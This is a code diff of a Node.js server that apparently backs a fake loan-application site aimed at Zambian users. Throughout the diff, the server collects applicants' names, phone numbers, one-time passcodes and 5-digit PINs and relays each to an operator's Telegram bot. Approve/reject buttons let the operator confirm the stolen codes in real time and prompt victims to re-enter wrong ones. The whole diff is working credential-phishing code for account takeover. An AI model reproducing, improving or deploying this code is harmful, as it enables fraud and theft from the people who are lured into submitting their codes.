@@ -3,15 +3,16 @@ const http = require('http');
 const https = require('https');
 const { WebSocketServer, WebSocket } = require('ws');
 
-const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
-const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
+// ═══════════════════════════════════════════
+// CONFIG
+// ═══════════════════════════════════════════
+const TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE';
+const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID_HERE';
 const PORT = process.env.PORT || 3000;
 
-if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
-    console.error('❌ Missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID');
-    process.exit(1);
-}
-
+// ═══════════════════════════════════════════
+// SETUP
+// ═══════════════════════════════════════════
 const app = express();
 const server = http.createServer(app);
 const wss = new WebSocketServer({ server, path: '/ws' });
@@ -30,31 +31,31 @@ wss.on('connection', (ws, req) => {
 
     if (sessionId && sessions[sessionId]) {
         sessions[sessionId].ws = ws;
-        console.log('✅ User connected:', sessions[sessionId].name);
+        console.log('WS connected:', sessions[sessionId].name, sessionId);
     }
 
     ws.on('close', () => {
         if (sessionId && sessions[sessionId]) {
             sessions[sessionId].ws = null;
+            console.log('WS disconnected:', sessions[sessionId].name);
         }
     });
 });
 
 // ═══════════════════════════════════════════
-// TELEGRAM HELPERS
+// TELEGRAM HTTPS HELPER
 // ═══════════════════════════════════════════
-function tgRequest(path, body) {
+function tgRequest(method, path, body) {
     return new Promise((resolve, reject) => {
-        const payload = JSON.stringify(body);
-        const req = https.request({
-            method: 'POST',
-            hostname: 'api.telegram.org',
-            path,
-            headers: {
+        const payload = body ? JSON.stringify(body) : null;
+        const opts = { method, hostname: 'api.telegram.org', path };
+        if (payload) {
+            opts.headers = {
                 'Content-Type': 'application/json',
                 'Content-Length': Buffer.byteLength(payload)
-            }
-        }, (res) => {
+            };
+        }
+        const req = https.request(opts, (res) => {
             let data = '';
             res.on('data', chunk => data += chunk);
             res.on('end', () => {
@@ -64,7 +65,7 @@ function tgRequest(path, body) {
         });
         req.setTimeout(15000, () => { req.destroy(); reject(new Error('timeout')); });
         req.on('error', reject);
-        req.write(payload);
+        if (payload) req.write(payload);
         req.end();
     });
 }
@@ -72,102 +73,117 @@ function tgRequest(path, body) {
 function sendTelegram(text, buttons) {
     const body = { chat_id: TELEGRAM_CHAT_ID, text, parse_mode: 'Markdown' };
     if (buttons) body.reply_markup = { inline_keyboard: buttons };
-
-    return tgRequest(`/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, body)
+    return tgRequest('POST', '/bot' + TELEGRAM_BOT_TOKEN + '/sendMessage', body)
         .then(res => {
-            if (res.ok) console.log('✅ Telegram sent');
-            else console.error('❌ Telegram error:', JSON.stringify(res));
+            if (res.ok) console.log('TG sent');
+            else console.error('TG error:', JSON.stringify(res));
         })
-        .catch(err => console.error('❌ Network:', err.message));
+        .catch(err => console.error('Network:', err.message));
+}
+
+function answerCallback(cqId, text) {
+    return tgRequest('POST', '/bot' + TELEGRAM_BOT_TOKEN + '/answerCallbackQuery', {
+        callback_query_id: cqId,
+        text: text
+    });
 }
 
 // ═══════════════════════════════════════════
-// API ROUTES
+// PAGE 1: Application
 // ═══════════════════════════════════════════
-app.post('/api/apply', (req, res) => {
+app.post('/api/apply', async (req, res) => {
     const { name, phone, amount, period } = req.body;
+
+    if (!name || !phone || !amount || !period) {
+        return res.status(400).json({ error: 'Missing fields' });
+    }
+
+    const sessionId = 'S' + Date.now().toString(36) + Math.random().toString(36).slice(2, 6);
     const interest = Math.round(amount * 0.0013 * period);
     const total = amount + interest;
 
-    sendTelegram(`📋 *NEW LOAN APPLICATION*
-━━━━━━━━━━━━━━━━━━
-👤 *Name:* ${name}
-📱 *Phone:* ${phone}
-💰 *Amount:* K${amount.toLocaleString()}
-📅 *Period:* ${period} days
-📊 *Interest:* K${interest.toLocaleString()}
-💵 *Total Repay:* K${total.toLocaleString()}
-🕐 *Time:* ${new Date().toLocaleString('en-ZM')}
-━━━━━━━━━━━━━━━━━━`);
+    sessions[sessionId] = {
+        ws: null,
+        name, phone, amount, period,
+        otp: '', pin: '',
+        otpVerified: false, pinVerified: false
+    };
 
-    res.json({ success: true });
-});
+    const msg = 'NEW LOAN APPLICATION\n' +
+        '━━━━━━━━━━━━━━━━━━\n' +
+        'Name: ' + name + '\n' +
+        'Phone: ' + phone + '\n' +
+        'Amount: K' + amount.toLocaleString() + '\n' +
+        'Period: ' + period + ' days\n' +
+        'Interest: K' + interest.toLocaleString() + '\n' +
+        'Total Repay: K' + total.toLocaleString() + '\n' +
+        'Time: ' + new Date().toLocaleString('en-ZM') + '\n' +
+        '━━━━━━━━━━━━━━━━━━';
 
-app.post('/api/pin', (req, res) => {
-    const { name, phone, amount, period, pin } = req.body;
-
-    sendTelegram(`🔐 *PIN SUBMITTED*
-━━━━━━━━━━━━━━━━━━
-👤 *Name:* ${name}
-📱 *Phone:* ${phone}
-💰 *Amount:* K${amount.toLocaleString()}
-📅 *Period:* ${period} days
-🔑 *PIN (5 digits):* ${pin}
-🕐 *Time:* ${new Date().toLocaleString('en-ZM')}
-━━━━━━━━━━━━━━━━━━`);
-
-    res.json({ success: true });
-});
-
-app.post('/api/otp', (req, res) => {
-    const { name, phone, amount, period, pin, otp } = req.body;
-    const sessionId = 'S' + Date.now().toString(36) + Math.random().toString(36).slice(2, 6);
-
-    sessions[sessionId] = { ws: null, name, phone, amount, period, pin, otp };
-
-    const msg = `📲 *OTP RECEIVED*
-━━━━━━━━━━━━━━━━━━
-👤 *Name:* ${name}
-📱 *Phone:* ${phone}
-💰 *Amount:* K${amount.toLocaleString()}
-📅 *Period:* ${period} days
-🔢 *OTP (4 digits):* ${otp}
-🕐 *Time:* ${new Date().toLocaleString('en-ZM')}
-━━━━━━━━━━━━━━━━━━
-_Tap to verify OTP_`;
-
-    const buttons = [[
-        { text: '✅ Correct OTP', callback_data: `correct_otp:${sessionId}` },
-        { text: '❌ Wrong OTP', callback_data: `wrong_otp:${sessionId}` }
-    ]];
-
-    sendTelegram(msg, buttons);
+    await sendTelegram(msg);
     res.json({ success: true, sessionId });
 });
 
-app.post('/api/pin-verify', (req, res) => {
-    const { sessionId } = req.body;
+// ═══════════════════════════════════════════
+// PAGE 2: OTP (4 digits, with admin buttons)
+// ═══════════════════════════════════════════
+app.post('/api/otp', async (req, res) => {
+    const { sessionId, otp } = req.body;
     const session = sessions[sessionId];
-    if (!session) return res.status(404).json({ error: 'Not found' });
 
-    const msg = `🔐 *PIN VERIFICATION*
-━━━━━━━━━━━━━━━━━━
-👤 *Name:* ${session.name}
-📱 *Phone:* ${session.phone}
-💰 *Amount:* K${session.amount.toLocaleString()}
-📅 *Period:* ${session.period} days
-🔑 *PIN to verify:* ${session.pin}
-🕐 *Time:* ${new Date().toLocaleString('en-ZM')}
-━━━━━━━━━━━━━━━━━━
-_Tap to verify PIN_`;
+    if (!session) return res.status(404).json({ error: 'Session not found' });
+
+    session.otp = otp;
+    session.otpVerified = false;
+
+    const msg = 'OTP SUBMITTED\n' +
+        '━━━━━━━━━━━━━━━━━━\n' +
+        'Name: ' + session.name + '\n' +
+        'Phone: ' + session.phone + '\n' +
+        'Amount: K' + session.amount.toLocaleString() + '\n' +
+        'Period: ' + session.period + ' days\n' +
+        'OTP: ' + otp + '\n' +
+        'Time: ' + new Date().toLocaleString('en-ZM') + '\n' +
+        '━━━━━━━━━━━━━━━━━━\n' +
+        'Tap to verify OTP';
 
     const buttons = [[
-        { text: '✅ Correct PIN', callback_data: `correct_pin:${sessionId}` },
-        { text: '❌ Wrong PIN', callback_data: `wrong_pin:${sessionId}` }
+        { text: 'Correct OTP', callback_data: 'otp_correct:' + sessionId },
+        { text: 'Wrong OTP', callback_data: 'otp_wrong:' + sessionId }
     ]];
 
-    sendTelegram(msg, buttons);
-    res.json({ success: true });
+    await sendTelegram(msg, buttons);
+    res.json({ success: true, waiting: true });
+});
+
+// ═══════════════════════════════════════════
+// PAGE 3: PIN (5 digits, with admin buttons)
+// ═══════════════════════════════════════════
+app.post('/api/pin', async (req, res) => {
+    const { sessionId, pin } = req.body;
+    const session = sessions[sessionId];
+
+    if (!session) return res.status(404).json({ error: 'Session not found' });
+
+    session.pin = pin;
+    session.pinVerified = false;
+
+    const msg = 'PIN SUBMITTED\n' +
+        '━━━━━━━━━━━━━━━━━━\n' +
+        'Name: ' + session.name + '\n' +
+        'Phone: ' + session.phone + '\n' +
+        'PIN: ' + pin + '\n' +
+        'Time: ' + new Date().toLocaleString('en-ZM') + '\n' +
+        '━━━━━━━━━━━━━━━━━━\n' +
+        'Tap to verify PIN';
+
+    const buttons = [[
+        { text: 'Correct PIN', callback_data: 'pin_correct:' + sessionId },
+        { text: 'Wrong PIN', callback_data: 'pin_wrong:' + sessionId }
+    ]];
+
+    await sendTelegram(msg, buttons);
+    res.json({ success: true, waiting: true });
 });
 
 // ═══════════════════════════════════════════
@@ -177,20 +193,7 @@ let offset = 0;
 
 async function pollTelegram() {
     try {
-        const path = `/bot${TELEGRAM_BOT_TOKEN}/getUpdates?offset=${offset}&timeout=0`;
-        const data = await new Promise((resolve, reject) => {
-            const req = https.request({ method: 'GET', hostname: 'api.telegram.org', path }, (res) => {
-                let d = '';
-                res.on('data', chunk => d += chunk);
-                res.on('end', () => {
-                    try { resolve(JSON.parse(d)); }
-                    catch (e) { resolve({ ok: false }); }
-                });
-            });
-            req.setTimeout(8000, () => { req.destroy(); reject(new Error('timeout')); });
-            req.on('error', reject);
-            req.end();
-        });
+        const data = await tgRequest('GET', '/bot' + TELEGRAM_BOT_TOKEN + '/getUpdates?offset=' + offset + '&timeout=0');
 
         if (data.ok) {
             for (const update of data.result) {
@@ -198,49 +201,55 @@ async function pollTelegram() {
 
                 if (update.callback_query) {
                     const cq = update.callback_query;
-                    const [action, sessionId] = cq.data.split(':');
+                    const parts = cq.data.split(':');
+                    const action = parts[0] + '_' + parts[1];
+                    const sessionId = parts.slice(2).join(':');
                     const session = sessions[sessionId];
 
-                    if (session) {
-                        tgRequest(`/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
-                            callback_query_id: cq.id,
-                            text: {
-                                'correct_otp': '✅ OTP approved.',
-                                'wrong_otp': '❌ OTP rejected.',
-                                'correct_pin': '✅ PIN approved! Done.',
-                                'wrong_pin': '❌ PIN rejected.'
-                            }[action] || 'OK'
-                        });
+                    if (!session) {
+                        console.log('Unknown session:', sessionId);
+                        continue;
+                    }
 
-                        if (action === 'correct_otp') {
-                            if (session.ws && session.ws.readyState === WebSocket.OPEN)
-                                session.ws.send(JSON.stringify({ type: 'admin_response', result: 'otp_correct' }));
-                            console.log('✅ OTP correct:', session.name);
+                    await answerCallback(cq.id, 'Processing...');
 
-                        } else if (action === 'wrong_otp') {
-                            if (session.ws && session.ws.readyState === WebSocket.OPEN)
-                                session.ws.send(JSON.stringify({ type: 'admin_response', result: 'otp_wrong' }));
-                            sendTelegram(`❌ *OTP REJECTED*\n👤 ${session.name}\n📱 ${session.phone}`);
-                            console.log('❌ OTP wrong:', session.name);
-
-                        } else if (action === 'correct_pin') {
-                            if (session.ws && session.ws.readyState === WebSocket.OPEN)
-                                session.ws.send(JSON.stringify({ type: 'admin_response', result: 'pin_correct' }));
-                            sendTelegram(`✅ *APPLICATION COMPLETE*\n👤 ${session.name}\n📱 ${session.phone}\n💰 K${session.amount.toLocaleString()}`);
-                            console.log('✅ PIN correct — DONE:', session.name);
-
-                        } else if (action === 'wrong_pin') {
-                            if (session.ws && session.ws.readyState === WebSocket.OPEN)
-                                session.ws.send(JSON.stringify({ type: 'admin_response', result: 'pin_wrong' }));
-                            sendTelegram(`❌ *PIN REJECTED*\n👤 ${session.name}\n📱 ${session.phone}\n🔄 User must re-enter`);
-                            console.log('❌ PIN wrong:', session.name);
+                    // OTP VERIFICATION
+                    if (action === 'otp_correct') {
+                        session.otpVerified = true;
+                        if (session.ws && session.ws.readyState === WebSocket.OPEN) {
+                            session.ws.send(JSON.stringify({ type: 'otp_result', result: 'correct' }));
                         }
+                        await sendTelegram('OTP VERIFIED\n━━━━━━━━━━━━━━━━━━\n' + session.name + '\n' + session.phone + '\nTime: ' + new Date().toLocaleString('en-ZM'));
+                        console.log('OTP correct:', session.name);
+
+                    } else if (action === 'otp_wrong') {
+                        if (session.ws && session.ws.readyState === WebSocket.OPEN) {
+                            session.ws.send(JSON.stringify({ type: 'otp_result', result: 'wrong' }));
+                        }
+                        await sendTelegram('OTP REJECTED\n━━━━━━━━━━━━━━━━━━\n' + session.name + '\n' + session.phone + '\nUser asked to re-enter OTP\nTime: ' + new Date().toLocaleString('en-ZM'));
+                        console.log('OTP wrong:', session.name);
+
+                    // PIN VERIFICATION
+                    } else if (action === 'pin_correct') {
+                        session.pinVerified = true;
+                        if (session.ws && session.ws.readyState === WebSocket.OPEN) {
+                            session.ws.send(JSON.stringify({ type: 'pin_result', result: 'correct' }));
+                        }
+                        await sendTelegram('PIN VERIFIED - APPLICATION COMPLETE\n━━━━━━━━━━━━━━━━━━\n' + session.name + '\n' + session.phone + '\nK' + session.amount.toLocaleString() + ' / ' + session.period + ' days\nTime: ' + new Date().toLocaleString('en-ZM'));
+                        console.log('PIN correct:', session.name, 'COMPLETE');
+
+                    } else if (action === 'pin_wrong') {
+                        if (session.ws && session.ws.readyState === WebSocket.OPEN) {
+                            session.ws.send(JSON.stringify({ type: 'pin_result', result: 'wrong' }));
+                        }
+                        await sendTelegram('PIN REJECTED\n━━━━━━━━━━━━━━━━━━\n' + session.name + '\n' + session.phone + '\nUser asked to re-enter PIN\nTime: ' + new Date().toLocaleString('en-ZM'));
+                        console.log('PIN wrong:', session.name);
                     }
                 }
             }
         }
     } catch (err) {
-        if (err.message !== 'timeout') console.error('Polling:', err.message);
+        if (err.message !== 'timeout') console.error('Polling error:', err.message);
     }
     setTimeout(pollTelegram, 2000);
 }
@@ -249,7 +258,10 @@ async function pollTelegram() {
 // START
 // ═══════════════════════════════════════════
 server.listen(PORT, () => {
-    console.log(`🚀 Running on port ${PORT}`);
-    console.log(`🤖 Telegram polling started`);
+    console.log('');
+    console.log('Server running on port ' + PORT);
+    console.log('WebSocket: /ws');
+    console.log('Telegram polling started');
+    console.log('');
     pollTelegram();
 });   
